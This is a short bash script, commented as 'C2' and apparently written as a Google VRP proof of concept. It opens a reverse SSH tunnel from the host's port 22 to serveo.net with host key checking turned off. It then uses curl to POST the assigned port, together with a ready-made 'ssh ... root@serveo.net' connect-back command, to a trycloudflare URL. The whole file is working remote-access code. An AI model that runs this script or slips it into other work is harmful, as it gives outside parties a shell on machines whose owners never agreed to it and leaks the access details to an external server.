#!/bin/bash
# C2: https://rainbow-nutrition-bottom-beginners.trycloudflare.com

URL="https://rainbow-nutrition-bottom-beginners.trycloudflare.com"

ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -f -R 0:localhost:22 serveo.net sleep 3600 2>&1 > /tmp/ssh_info

# Wait 10 seconds (gives Serveo more time to assign a port)
sleep 10

# Grab the SPECIFIC port from the log
SSH_PORT=$(grep -oE "port [0-9]+" /tmp/ssh_info | awk '{print $2}')

{
  echo "--- GOOGLE VRP: SSH SESSION READY ---"
  echo "TIMESTAMP: $(date)"
  if [ -z "$SSH_PORT" ]; then
    echo "ERROR: Serveo didn't assign a port yet. Log output:"
    cat /tmp/ssh_info
  else
    echo "COMMAND TO RUN ON YOUR MAC:"
    echo "ssh -v -p $SSH_PORT root@serveo.net"
  fi
  echo "--------------------------------------"
} | curl -s -X POST --data-binary @- "$URL"
